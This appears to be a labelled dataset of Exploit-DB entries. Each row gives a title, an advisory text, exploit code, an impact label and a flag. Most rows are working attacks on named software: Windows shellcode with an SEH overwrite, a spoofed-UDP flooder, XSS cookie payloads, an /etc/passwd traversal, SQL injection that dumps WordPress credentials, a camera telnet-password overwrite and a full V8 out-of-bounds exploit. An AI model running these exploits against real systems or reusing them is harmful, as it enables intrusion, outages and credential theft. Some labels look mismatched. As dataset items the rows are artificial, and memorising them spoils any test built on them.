""\x4c\x4b\x66\x54\x6c\x4b\x73\x31\x49\x46\x64\x71"" shellcode += ""\x4b\x4f\x6c\x6c\x5a\x61\x68\x4f\x66\x6d\x77\x71"" shellcode += ""\x69\x57\x30\x38\x4b\x50\x74\x35\x58\x76\x55\x53"" shellcode += ""\x71\x6d\x6b\x48\x55\x6b\x73\x4d\x44\x64\x32\x55"" shellcode += ""\x4a\x44\x43\x68\x4c\x4b\x70\x58\x31\x34\x65\x51"" shellcode += ""\x4a\x73\x62\x46\x4e\x6b\x54\x4c\x52\x6b\x6e\x6b"" shellcode += ""\x33\x68\x37\x6c\x43\x31\x4b\x63\x6e\x6b\x34\x44"" shellcode += ""\x6c\x4b\x43\x31\x4a\x70\x4c\x49\x37\x34\x37\x54"" shellcode += ""\x44\x64\x51\x4b\x73\x6b\x53\x51\x52\x79\x52\x7a"" shellcode += ""\x42\x71\x6b\x4f\x69\x70\x71\x4f\x43\x6f\x32\x7a"" shellcode += ""\x4c\x4b\x37\x62\x7a\x4b\x4e\x6d\x71\x4d\x55\x38"" shellcode += ""\x56\x53\x70\x32\x77\x70\x65\x50\x62\x48\x44\x37"" shellcode += ""\x42\x53\x74\x72\x63\x6f\x43\x64\x33\x58\x42\x6c"" shellcode += ""\x63\x47\x31\x36\x54\x47\x6d\x59\x6b\x58\x69\x6f"" shellcode += ""\x4e\x30\x4e\x58\x4c\x50\x67\x71\x47\x70\x67\x70"" shellcode += ""\x37\x59\x4a\x64\x31\x44\x56\x30\x70\x68\x55\x79"" shellcode += ""\x4f\x70\x30\x6b\x63\x30\x6b\x4f\x68\x55\x61\x7a"" shellcode += ""\x35\x5a\x72\x48\x39\x50\x79\x38\x45\x51\x4f\x71"" shellcode += ""\x52\x48\x46\x62\x43\x30\x32\x36\x39\x39\x6c\x49"" shellcode += ""\x59\x76\x36\x30\x46\x30\x36\x30\x32\x70\x51\x50"" shellcode += ""\x36\x30\x67\x30\x76\x30\x32\x48\x6a\x4a\x56\x6f"" shellcode += ""\x79\x4f\x39\x70\x59\x6f\x79\x45\x5a\x37\x70\x6a"" shellcode += ""\x46\x70\x71\x46\x63\x67\x30\x68\x6e\x79\x69\x35"" shellcode += ""\x44\x34\x30\x61\x59\x6f\x59\x45\x6d\x55\x49\x50"" shellcode += ""\x53\x44\x55\x5a\x79\x6f\x30\x4e\x66\x68\x53\x45"" shellcode += ""\x6a\x4c\x6a\x48\x52\x47\x73\x30\x33\x30\x73\x30"" shellcode += ""\x61\x7a\x55\x50\x33\x5a\x67\x74\x71\x46\x66\x37"" shellcode += ""\x62\x48\x45\x52\x68\x59\x4f\x38\x51\x4f\x59\x6f"" shellcode += ""\x6b\x65\x4f\x73\x7a\x58\x53\x30\x63\x4e\x57\x46"" shellcode += ""\x4c\x4b\x35\x66\x32\x4a\x63\x70\x72\x48\x63\x30"" shellcode += ""\x76\x70\x65\x50\x77\x70\x73\x66\x62\x4a\x37\x70"" shellcode += ""\x32\x48\x46\x38\x4e\x44\x76\x33\x79\x75\x79\x6f"" shellcode += ""\x5a\x75\x6e\x73\x76\x33\x52\x4a\x73\x30\x76\x36"" shellcode += ""\x42\x73\x32\x77\x33\x58\x45\x52\x78\x59\x78\x48"" shellcode += ""\x61\x4f\x39\x6f\x59\x45\x4d\x53\x49\x68\x45\x50"" shellcode += ""\x73\x4d\x61\x38\x71\x48\x62\x48\x55\x50\x53\x70"" shellcode += ""\x35\x50\x53\x30\x33\x5a\x45\x50\x76\x30\x33\x58"" shellcode += ""\x56\x6b\x34\x6f\x46\x6f\x34\x70\x4b\x4f\x78\x55"" shellcode += ""\x71\x47\x75\x38\x31\x65\x70\x6e\x52\x6d\x50\x61"" shellcode += ""\x4b\x4f\x79\x45\x33\x6e\x31\x4e\x4b\x4f\x44\x4c"" shellcode += ""\x76\x44\x56\x6f\x4e\x65\x72\x50\x79\x6f\x69\x6f"" shellcode += ""\x6b\x4f\x68\x69\x4d\x4b\x79\x6f\x79\x6f\x49\x6f"" shellcode += ""\x56\x61\x5a\x63\x71\x39\x69\x56\x51\x65\x69\x51"" shellcode += ""\x4f\x33\x6d\x6b\x5a\x50\x68\x35\x4e\x42\x50\x56"" shellcode += ""\x52\x4a\x57\x70\x36\x33\x69\x6f\x5a\x75\x41\x41""  egghunter =""\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8""+""SOUF""+""\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7""  nseh_jmp = ""\xeb\xaa""	#jmp back 84 bytes seh = ""\x87\x1d\x40""	# (xiwin32.exe) 0x00401d87 -> pop/pop/ret. ( Parial Overwrite )  payload = ""A""*120 payload += egghunter payload += ""A""*(190-len(payload)) payload += nseh_jmp payload += seh  http_req = ""GET / HTTP/1.1\r\n"" http_req += ""Host: ""+ TCP_IP +""\r\n"" http_req += ""User-Agent: ""+egg+nops+shellcode+""\r\n"" http_req += ""If-Modified-Since: Wed, "" + payload + ""\r\n\r\n""  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TCP_IP, TCP_PORT)) print ""[+] Sending exploit payload..."" s.send(http_req) s.close()",code execution,1
21172,"Microsoft Windows Server 2000 - Internet Key Exchange Denial of Service (2) source: https://www.securityfocus.com/bid/3652/info   Internet Protocol Security (IPSec) provides authentication and encryption for IP network traffic. The Internet Key Exchange (IKE) protocol is a management protocol standard which is used with the IPSec standard. IKE contributes to the IPSec standard by providing additional features and by default listens on UDP port 500.       An issue exists in IKE which could cause a Windows 2000 host to stop responding.       Connecting to port 500 and submitting a continuous stream of arbitrary packets, will cause the CPU utilization to spike to approximately 100%.     It should be noted that this vulnerability may be due to an underlying issue with the UDP protocol.  #!/usr/bin/perl -w ############################################################################### # Author        :       Nelson Brito # E-mail        :       nelson@SEKURE.ORG # File          :       nb-isakmp.pl # Version       :       0.3 Alpha ############################################################################### use Socket; use Net::RawIP; use Getopt::Std;  getopts(""s:d:p:l:n:v:t:f:rL"",\%o);$ver=""0.3a"";$0=~s#.*/##;  print""--- $0 v.$ver b/ Nelson Brito / Independent Security Consultant ---\n"";  $l=$o{'l'}?$o{'l'}+28:800+28;$n=$o{'n'}?$o{'n'}/2:800/2; $v=$o{'v'}||4;$t=$o{'t'}||1;$f=$o{'f'}||0;$T=$o{'T'}||64; $p=$o{'p'}?$o{'p'}:(getservbyname('isakmp','udp')||die""getservbyname: $!\n"");  ($o{'s'}&&$o{'d'})||die ""\nUse: $0 [IP Options] [UDP Options]\n\n"", ""IP Options:\n"", ""\t\t-s*\tsource address to spoof\n"", ""\t\t-d*\tdestination address to attack\n"", ""\t\t-v\tIP Version\t\t\t\t(def: $v)\n"", ""\t\t-t\tIP Type of Service (TOS)\t\t(def: $t)\n"", ""\t\t-f\tIP fragementation offset\t\t(def: $f)\n"", ""\t\t-T\tIP Time to Live (TTL)\t\t\t(def: $T)\n"", ""UDP Options:\n"", ""\t\t-p\tdestination port to attack\t\t(def: $p)\n"", ""\t\t-l\tpacket length to send\t\t\t(def: $l)\n"", ""\t\t-r\tset randon data\t\t\t\t(def: \"".\"")\n"", ""Generic:\n"", ""\t\t-n\tnumber of packets to send\t\t(def: $n)\n"", ""\t\t-L\tsend packets forever\n\n"", ""Copyright � 2000 Nelson Brito <nelson\@SEKURE.ORG>.\n"";  while($n > 0){ 	$|=1;print""."";$sp=int rand 65535; 	$D=$o{'r'}?(chr(int rand 255)) x $l:""."" x $l; 	$nb=new Net::RawIP({ 		ip=> 		{ 			version=>$v, 			tos=>$t, 			ttl=>$T, 			frag_off=>$f, 			saddr=>$o{'s'}, 			daddr=>$o{'d'} 		}, 		udp=> 		{ 			source=>$sp, 			dest=>$p, 			len=>$l, 			data=>$D 		} 	}); 	$nb->send;undef $nb;!$o{'L'}&&$n--; } print""Finish!\n"";",the CPU utilization to spike to approximately 100%,1
29648,"Active Calendar 1.2 - '/data/m_2.php?css' Cross-Site Scripting source: https://www.securityfocus.com/bid/22705/info    Active Calendar is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.    Active Calendar 1.2.0 is vulnerable; other versions may also be affected.   http://www.example.com/activecalendar/data/m_2.php?css=""><script>alert(document.cookie)</script>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
27107,PHPXplorer 0.9.33 - 'action.php' Directory Traversal source: https://www.securityfocus.com/bid/16292/info  phpXplorer is prone to a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the Web server process. Information obtained may aid in further attacks; other attacks are also possible.  Version 0.9.33 is vulnerable; other versions may also be affected.   http://www.example.com/folder/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00  http://www.example.com/phpXplorer/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00  http://www.example.com/phpXplorer/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00,retrieve arbitrary files from the vulnerable system in the context of the Web server process,1
30998,"SynCE 0.92 - 'vdccm' Daemon Remote Command Injection source: https://www.securityfocus.com/bid/27178/info  SynCE is prone to a remote command-injection vulnerability because it fails to adequately sanitize user-supplied input data.  Attackers can exploit this issue to execute arbitrary commands in the context of the application, facilitating the remote compromise of affected computers.  SynCE 0.92 is vulnerable; other versions may also be affected.   import socket, struct import time def AtoWChar(string):     return ''.join([x+chr(0) for x in string])  HOST = '192.168.XXX.XXX' PORT = 5679 c= socket.socket(socket.AF_INET, socket.SOCK_STREAM) c.connect((HOST, PORT)) buf=""\x00""*0x18 buf+='\x30\x00\x00\x00' buf+='\x30\x00\x00\x00' buf+='\x30\x00\x00\x00' buf+=""\x00""*12 string=AtoWChar(""&/usr/bin/touch /tmp/vulnerability"") buf+=string+""\x00\x00""+""\x00""*12 c.send(struct.pack(""L"",63+len(string))+buf+""\x00"" ) - ---------------------------  NOTE: for this proof of concept to work, a script file is needed on the ""$home$/.synce/scripts"" directory. Some linux distributions ship with scripts on this directory by default.",fails to adequately sanitize user-supplied input data,0
37346,"Paintshop Pro X7 - '.gif' Conversion Heap Memory Corruption 'LZWMinimumCodeSize' (Denial of Service) #####################################################################################  Application:   Paintshop Pro X7 GIF Conversion  Heap Memory Corruption Vulnerabilities (LZWMinimumCodeSize)  Platforms:   Windows  Versions:   The vulnerability is confirmed in version Paintshop Prox X7, Other versions may also be affected.  Secunia:  {PRL}:   2015-06  Author:   Francis Provencher (Protek Research Lab’s)  Website:   http://www.protekresearchlab.com/  Twitter:   @ProtekResearch  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  =============== 1) Introduction ===============     PaintShop Pro (PSP) is a raster and vector graphics editor for Microsoft Windows. It was originally published by Jasc Software. In October 2004, Corel purchased Jasc Software and the distribution rights to Paint Shop Pro. PSP functionality can be extended by Photoshop-compatible plugins.  Although often written as Paint Shop Pro, Corel’s website shows the name for the product as PaintShop Pro. The X-numbered editions have been sold in two versions: PaintShop Pro, which is the basic editing program, and PaintShop Pro Ultimate, which bundles in other standalone programs. The particular bundled programs have varied with each numbered version and have not been sold by Corel as separate products.  (https://en.wikipedia.org/wiki/PaintShop_Pro)  #####################################################################################  ============================ 2) Report Timeline ============================  2015-04-23: Francis Provencher from Protek Research Lab’s found the issue; 2015-02-24: Francis Provencher From Protek Research Lab’s ask for a security contact at Corel Software; 2015-02-25: Francis Provencher From Protek Research Lab’s ask for a security contact at Corel Software; 2015-05-10: Corel push a silent fix, without credit.  2015-05-16: Publication of this advisory.     #####################################################################################  ============================ 3) Technical details ============================  An error when handling LZWMinimumCodeSize can be exploited to cause an heap memory corruption via a specially crafted GIF file.  #####################################################################################  ===========  4) POC  ===========  http://protekresearchlab.com/exploits/PRL-2015-06.gif https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37346.gif  ###############################################################################",Memory Corruption,1
32908,IBM Tivoli Continuous Data Protection for Files 3.1.4.0 - Cross-Site Scripting source: https://www.securityfocus.com/bid/34513/info  IBM Tivoli Continuous Data Protection for Files is prone to a cross-site scripting vulnerability.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials.  IBM Tivoli Continuous Data Protection for Files 3.1.4.0 is vulnerable; other versions may also be affected.  http://www.example.com/login/FilepathLogin.html?reason=<script>alert(0)</script>,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials,1
17814,"WordPress Plugin Event Registration 5.44 - SQL Injection # Exploit Title: Wordpress Event Registration plugin <= 5.44 SQl Injection Vulnerability # Google Dork: ""?regevent_action=register&event_id"" # Date: 2011-09-09 # Author: serk # Vendor: http://edgetechweb.com/ # Software Link: https://wordpress.org/extend/plugins/events-registration/ # Version: 5.44   [ exploit ]  domain.tld/events-2/?regevent_action=register&event_id=2%20UNION%20SELECT%201,concat%28user_login,0x3a,user_pass,0x3a,user_email%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33%20from%20wp_users--",information disclosure,1
43997,"Herospeed - 'TelnetSwitch' Remote Stack Overflow / Overwrite Password / Enable TelnetD #!/usr/bin/env python2.7 # # Herospeed TelnetSwitch daemon running on TCP/787, for allowing enable of the telnetd. # Where one small stack overflow allows us to overwrite the dynamicly generated password and enable telnetd. # # [Verified] # 1) Fullhan IPC FH8830_F22_W_7.1.42.1 # 2) Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5 # 3) HiSilicon 3518EV200_OV9732_W_7.1.25.1, 3519V100_IMX274_W_7.1.39.3 # 4) Ambarella s2l55m_imx123_W_7.1.25.2, S2E66_IMX178_W_7.1.3.4 # # Author: bashis <mcw noemail eu>, 2018 # import socket import select import sys import argparse import base64 import struct import time # # Validate correctness of HOST, IP and PORT # class Validate:  	def __init__(self,verbose): 		self.verbose = verbose  	# Check if IP is valid 	def CheckIP(self,IP): 		self.IP = IP  		ip = self.IP.split('.') 		if len(ip) != 4: 			return False 		for tmp in ip: 			if not tmp.isdigit(): 				return False 			i = int(tmp) 			if i < 0 or i > 255: 				return False 		return True  	# Check if PORT is valid 	def Port(self,PORT): 		self.PORT = PORT  		if int(self.PORT) < 1 or int(self.PORT) > 65535: 			return False 		else: 			return True  	# Check if HOST is valid 	def Host(self,HOST): 		self.HOST = HOST  		try: 			# Check valid IP 			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP 			# Now we check if it is correct typed IP 			if self.CheckIP(self.HOST): 				return self.HOST 			else: 				return False 		except socket.error as e: 			# Else check valid DNS name, and use the IP address 			try: 				self.HOST = socket.gethostbyname(self.HOST) 				return self.HOST 			except socket.error as e: 				return False   if __name__ == ""__main__"":  	INFO =  '\n[Herospeed TelnetSwitch pwn (2018 bashis <mcw noemail eu>)]\n' 	rhost = '192.168.57.20'	# Default Remote HOST 	rport = 787			# Default Remote PORT 	BUFFER_SIZE = 1024  	try: 		arg_parser = argparse.ArgumentParser( 		prog=sys.argv[0], 				description=('[*] '+ INFO +' [*]')) 		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']') 		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']') 		args = arg_parser.parse_args() 	except Exception as e: 		print INFO,""\nError: {}\n"".format(str(e)) 		sys.exit(1)  	print INFO 	if args.rport: 		rport = int(args.rport)  	if args.rhost: 		rhost = args.rhost 		IP = args.rhost  	# Check if RPORT is valid 	if not Validate(True).Port(rport): 		print ""[!] Invalid RPORT - Choose between 1 and 65535"" 		sys.exit(1)  	# Check if RHOST is valid IP or FQDN, get IP back 	rhost = Validate(True).Host(rhost) 	if not rhost: 		print ""[!] Invalid RHOST"" 		sys.exit(1)  	timeout = 5 	socket.setdefaulttimeout(timeout)  	# 	# [Payload] 	#  	LOGIN = ""Lucky787""		# Hardcoded login 	# 	# Fullhan IPC FH8830_F22_W_7.1.42.1 	# Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5 	# 	PASSWD = ""\n\n\n\n\n\n\n\n\n\n\n\n""	# Our new password, must be exactly 12 char, and must be '\n' 	MESSAGE =  ''+ LOGIN + ':' + PASSWD +'' 	BASE64_NULL = ""A"" * 232 # Decoded as 0x00 with base64 decode 	HEAP_PWD = 0x00016c8c # Start of the dynamicly generated password, located on heap  	# 	# HiSilicon 3518EV200_OV9732_W_7.1.25.1 	# #	PASSWD = ""AAAAAAAAAAAA""	# Our new password, must be exactly 12 char, and must be 'A' #	MESSAGE =  ''+ LOGIN + ':' + PASSWD +'' #	BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode #	HEAP_PWD = 0x00016990 # Start of the dynamicly generated password, located on heap  	# 	# HiSilicon 3519V100_IMX274_W_7.1.39.3 	# #	PASSWD = ""AAAAAAAAAAAA""	# Our new password, must be exactly 12 char, and must be 'A' #	MESSAGE =  ''+ LOGIN + ':' + PASSWD +'' #	BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode #	HEAP_PWD = 0x000267b0 # Start of the dynamicly generated password, located on heap  	# 	# Ambarella s2l55m_imx123_W_7.1.25.2 	# #	PASSWD = ""AAAAAAAAAAAA""	# Our new password, must be exactly 12 char, and must be 'A' #	MESSAGE =  ''+ LOGIN + ':' + PASSWD +'' #	BASE64_NULL = ""A"" * 364 # Decoded as 0x00 with base64 decode #	HEAP_PWD = 0x00014c3c # Start of the dynamicly generated password, located on heap  	# 	# Ambarella S2E66_IMX178_W_7.1.3.4 	# #	PASSWD = ""AAAAAAAAAAAA""	# Our new password, must be exactly 12 char, and must be 'A' #	MESSAGE =  ''+ LOGIN + ':' + PASSWD +'' #	BASE64_NULL = ""A"" * 108 # Decoded as 0x00 with base64 decode #	HEAP_PWD = 0x00014c68 # Start of the dynamicly generated password, located on heap  	MESSAGE = base64.b64encode(bytes(MESSAGE)) 	MESSAGE += BASE64_NULL  	# 	# Since the stack overflow writing with only one byte, we need overwrite the password one char at the time (looping twelve times) 	# 	for where in range(0, len(PASSWD)): 		OUT = ""GET / HTTP/1.0\nAuthorization: Basic {}{}\n\n"".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3]) 		print ""Writing to: {}"".format(hex(HEAP_PWD)) 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		s.connect((rhost, rport)) 		s.send(OUT) 		time.sleep(0.5) 		response = s.recv(BUFFER_SIZE).split() 		HEAP_PWD += 0x1 # Next address on heap  		if response[1]: 			if response[1] == ""200"": 				print ""({}) OK, telnetd should be open!"".format(response[1]) 				break",information disclosure,1
24004,"phpBugTracker 0.9 - 'bug.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/10153/info   Reportedly phpBugTracker contains multiple input validation vulnerabilities; it is prone to multiple SQL injection, cross-site scripting and HTML injection issues. These issues are all due to a failure of the application to properly sanitize user supplied input.   The SQL injection issues may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.   The cross-site scripting and HTML injection issues may allow an attacker to execute arbitrary script code in the browser of an unsuspecting user. It may be possible to steal the unsuspecting user's cookie-based authentication credentials, as well as other sensitive information. Other attacks may also be possible.  http://www.example.com/bug.php?op=vote&bugid=[SQL] http://www.example.com/bug.php?op=viewvotes&bugid=[SQL] http://www.example.com/user.php?op=delvote&bugid=[SQL]",unauthorized access to sensitive information such as the administrator password hash or corruption of database data,1
28122,"vCard PRO - 'search.php?event_id' SQL Injection source: https://www.securityfocus.com/bid/18699/info     VCard PRO is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.     A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.     http://www.example.com/search.php?event_id=[SQL]","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation",1
46837,"Google Chrome V8 - Turbofan JSCallReducer::ReduceArrayIndexOfIncludes Out-of-Bounds Read/Write <!-- Since commit https://chromium.googlesource.com/v8/v8.git/+/c22bb466d8934685d897708119543d099b9d2a9a turbofan supports inlining calls to array.includes and array.indexOf. The logic of the function is roughly:  1. Check the set of possible Maps of the array type (with NodeProperties::InferReceiverMaps). 2. If they are all fast arrays, find the correct CSA builtin to handle the fast path (`Callable const callable = search_variant == SearchVariant::kIndexOf ? GetCallableForArrayIndexOf(kind, isolate()) : GetCallableForArrayIncludes(kind, isolate());`). 3. Load the array length and call the builtin. The builtin will assume that the array is a FastArray with packed (dense) elements and directly search linearly through the backing memory.  The issue here is that NodeProperties::InferReceiverMaps doesn't necessarily guarantee that the object will always have the inferred Map. In case it can't prove that the objects will always have the inferred Maps it will return kUnreliableReceiverMaps:      // Walks up the {effect} chain to find a witness that provides map     // information about the {receiver}. Can look through potentially     // side effecting nodes.     enum InferReceiverMapsResult {       kNoReceiverMaps,         // No receiver maps inferred.       kReliableReceiverMaps,   // Receiver maps can be trusted.       kUnreliableReceiverMaps  // Receiver maps might have changed (side-effect),                                                   // but instance type is reliable.     };     static InferReceiverMapsResult InferReceiverMaps(         JSHeapBroker* broker, Node* receiver, Node* effect,         ZoneHandleSet<Map>* maps_return);  In which case the caller is responsible for guarding any optimizations based on the inferred Maps (e.g. by adding MapChecks). However, in this case the calling function fails to do so. As such, if the array is changed to dictionary mode before the inlined function call, the CSA builtin will read data out-of-bounds.  The following sample, found through fuzzing, triggers this case:       function v7(v8,v11) {         function v14(v15,v16) { }         // Transition to dictionary mode in the final invocation.         const v17 = v11.__defineSetter__(v8, v14);         // Will then read OOB.         const v18 = v11.includes(1234);         return v18;     }     v7([], []);     v7([], []);     %OptimizeFunctionOnNextCall(v7);     v7([], []);      const v57 = v7(String(0x1000000), []);  Note: the commit introducing this vulnerability does not appear to be included in the stable Chrome release yet. -->  <script> var conv_ab = new ArrayBuffer(8); var conv_f64 = new Float64Array(conv_ab); var conv_u64 = new BigUint64Array(conv_ab); BigInt.prototype.to_float = function() {   conv_u64[0] = this;   return conv_f64[0]; }; BigInt.prototype.hex = function() {   return '0x'+this.toString(16); }; Number.prototype.to_int = function() {   conv_f64[0] = this;   return conv_u64[0]; } Number.prototype.hex = function() {   return this.to_int().hex(); }  let ab = undefined;  function leak(i, smi_arr, float_arr) {   let high_bytes = 0;   smi_arr.__defineSetter__(i, ()=>{});   ab = new ArrayBuffer(2<<26);   let smi_boundary = [1, 1, 1, 1];   for (high_bytes = 0; high_bytes < 0xffff; high_bytes++) {     smi_boundary[0] = high_bytes;     let idx = smi_arr.indexOf(high_bytes, 20);     if (idx == 20) {       break;     }   }    float_arr.__defineSetter__(i, ()=>{});   let tmp = new Uint32Array(ab);   let float_boundary = [1.1, 1.1, 1.1, 1.1];    let start = (BigInt(high_bytes)<<32n).to_float();   let end = ((BigInt(high_bytes)<<32n)+0x1000000n).to_float();   let step = 0x1000n.to_float();    for (let j = start; j < end; j += step) {     float_boundary[0] = j;     if (float_arr.indexOf(j, 30) == 30) {       return [j, smi_boundary, float_boundary, tmp];     }   } }  for (let i = 0; i < 10; i++) {   leak('', [1], [1.1]); }  let res = leak('100000', [1], [1.1]); if (res == undefined) {   location.reload();   return; } let ab_addr = res[0].to_int();  console.log(`Buf at ${ab_addr.hex()}`);  let u64 = new BigUint64Array(ab);  function write_map(offset, type) {   u64[offset/8n + 0x0n] = 0x12345n;   u64[offset/8n + 0x1n] = 0x190000002900a804n | (type << 32n);   u64[offset/8n + 0x2n] = 0x92003ffn;  // bitfield 3   u64[offset/8n + 0x3n] = 0x41414141n; // prototype   u64[offset/8n + 0x4n] = 0x41414141n; // constructor or back ptr   u64[offset/8n + 0x5n] = 0n;          // transistions or proto info   u64[offset/8n + 0x6n] = 0x41414141n; // instance descriptors   u64[offset/8n + 0x7n] = 0n;          // layout descriptor   u64[offset/8n + 0x8n] = 0x41414141n; // dependent code   u64[offset/8n + 0x9n] = 0n;          // prototype validity cell }  // SPACE_SIZE = 1<<18 // LARGE_OBJ_SIZE = (1<<17) +1  const SPACE_SIZE = 1n<<19n; const SPACE_MASK = 0xffffffffffffffffn ^ (SPACE_SIZE-1n);  let space_start_addr = (ab_addr & SPACE_MASK) + SPACE_SIZE; let space_start_off = space_start_addr - ab_addr;  console.log(`Space start: ${space_start_addr.hex()}`);  let free_mem = space_start_addr + 4096n;  function page_round(addr) {   if ((addr & 0xfffn) == 0n) {     return addr;   }   return (addr + 0x1000n) & 0xfffffffffffff000n; }  function u64_offset(addr) {   return (addr - ab_addr) / 8n; }  class V8String {   constructor(type, data) {     let size = BigInt(data.length)*8n;     this.addr = free_mem;     free_mem += page_round(size);     this.map = free_mem;     free_mem += page_round(0x9n*8n);     this.off = u64_offset(this.addr);     u64[this.off] = this.map|1n;     for (let i = 0n; i < data.length; i++) {       u64[this.off + 1n + i] = data[i];     }     let map_off = u64_offset(this.map);     u64[map_off + 0x0n] = 0x12345n;     u64[map_off + 0x1n] = 0x190000002900a804n | (type << 32n);     u64[map_off + 0x2n] = 0x92003ffn;  // bitfield 3     u64[map_off + 0x3n] = 0x41414141n; // prototype     u64[map_off + 0x4n] = 0x41414141n; // constructor or back ptr     u64[map_off + 0x5n] = 0n;          // transistions or proto info     u64[map_off + 0x6n] = 0x41414141n; // instance descriptors     u64[map_off + 0x7n] = 0n;          // layout descriptor     u64[map_off + 0x8n] = 0x41414141n; // dependent code     u64[map_off + 0x9n] = 0n;          // prototype validity cell   } }  class ConsString extends V8String {   constructor(size, left, right) {     super(0x29n, [(size<<32n) | 0x00000003n, left|1n, right|1n]);   } }  class SliceString extends V8String {   constructor(parent_string, offset, len=0x100n) {     super(0x2bn, [(len<<32n) | 0x00000003n, parent_string|1n, offset<<32n]);   } }  class SeqString extends V8String {   constructor(data) {     super(0x08n, [(BigInt(data.length*8) << 32n | 0xdf61f02en)].concat(data));   } }  // object in young generation == space+8 has one of these bits set: 0x18 u64[space_start_off/8n + 0x1n] = 0x18n;  LEAK_STRING_SZ = 0x1;  let seq_string = new SeqString([0x4141414141414141n]); let root_string = new ConsString(BigInt(LEAK_STRING_SZ), seq_string.addr, seq_string.addr);  function foo(i, arr, to_search, to_copy) {   arr.__defineSetter__(i, ()=>{});   let a = [1.1, to_copy];   let boundary = [to_search];   return [arr.indexOf(to_search), a, boundary]; }  for (let i = 0; i < 100000; i++) {   foo('', [Array], '', 1.1); }  function doit(to_search, to_copy) {   return foo('100000', [Array], to_search, to_copy)[0]; }  doit('A'.repeat(LEAK_STRING_SZ), (root_string.addr|1n).to_float()); let corrupted_array = [1.1, 1.2, 1.3];  console.log(`string at = ${u64[root_string.off+2n].hex()}`);  let corrupted_array_addr = u64[root_string.off+2n]+0x40n; let backing_store_sz_addr = corrupted_array_addr + 0x38n;   GC_STRING_SZ = 0x30000000;  u64[space_start_off/8n + 0x0n] = 0x1234n; // object in young generation == space+8 has one of these bits set: 0x18 u64[space_start_off/8n + 0x1n] = 0xff000n; // marking bitmap pointer u64[space_start_off/8n + 0x2n] = backing_store_sz_addr + 4n - (0x70n*0x4n); u64[space_start_off/8n + 0x6n] = space_start_addr; // incremental_marking ptr u64[space_start_off/8n + 0xf7n] = space_start_addr;  seq_string = new SeqString([0x4141414141414141n]); root_string = new ConsString(BigInt(GC_STRING_SZ), seq_string.addr, seq_string.addr); doit('A'.repeat(GC_STRING_SZ), (root_string.addr|1n).to_float()); corrupted_array[100] = 1.1; console.log('=== OOB array leak ==='); for (let i = 0; i < 100; i++) {   console.log(corrupted_array[i].hex()); } </script>",denial of service,1
27986,"Microsoft Internet Explorer 5.5/6.0/7.0 - JavaScript Key Filtering source: https://www.securityfocus.com/bid/18308/info  Multiple web browsers are prone to a JavaScript key-filtering vulnerability because the browsers fail to securely handle keystroke input from users.  This issue is demonstrated to allow attackers to divert keystrokes from one input form in a webpage to a hidden file-upload dialog in the same page. This may allow remote attackers to initiate file uploads from unsuspecting users. Other attacks may also be possible.  Exploiting this issue requires that users manually type the full path of files that attackers wish to download. This may require substantial typing from targeted users, so attackers will likely use keyboard-based games, blogs, or other similar pages to entice users to enter the required keyboard input to exploit this issue.  Reportedly, Mozilla Suite, Mozilla Firefox, Mozilla SeaMonkey, Netscape Navigator, and Microsoft Internet Explorer are all vulnerable to this issue.   <HTML> <HEAD> <SCRIPT> //document.onKeyDown = doKeyPress;  //document.onKeyUp = doKeyUp; var saved; var e ; var mystring = ""C:\\BOOT.INI""; var i=mystring.length-1;  function doKeyPress () { e = window.event; saved = e.keyCode; window.status = ""e.keyCode == "" + e.keyCode + ""character is "" + mystring.charCodeAt(i); if(e.keyCode != mystring.charCodeAt(i))     {     //e.keyCode =0;     e.returnValue=false;     e.cancelBubble=true; } else {     i--; } document.forms[0].fileupload.focus();  }  function doKeyUp () {  document.forms[0].txt.value += String.fromCharCode(saved); document.forms[0].txt.focus();  }  function switchtype() {   /*  var e = document.getElementById('txt');        document.forms[0].txt.setAttribute(""type"", ""file"");        e.setAttribute(""value"", ""asfasfsd"");   */ }  function fux0rKeys() {    } </SCRIPT> </HEAD> <BODY onload=""document.forms[0].txt.value='sometext'; document.forms[0].fileupload.value='asdfsdfadsf';""> <FORM METHOD=POST action=file.php> <INPUT id='asdf' name=""fileupload"" defaultValue='asdfasdf' TYPE=FILE OnKeyUp=""doKeyUp();"" OnKeyPress=""doKeyPress();""> <input name=txt id='txt' type=text value='asdfsdafasdf' 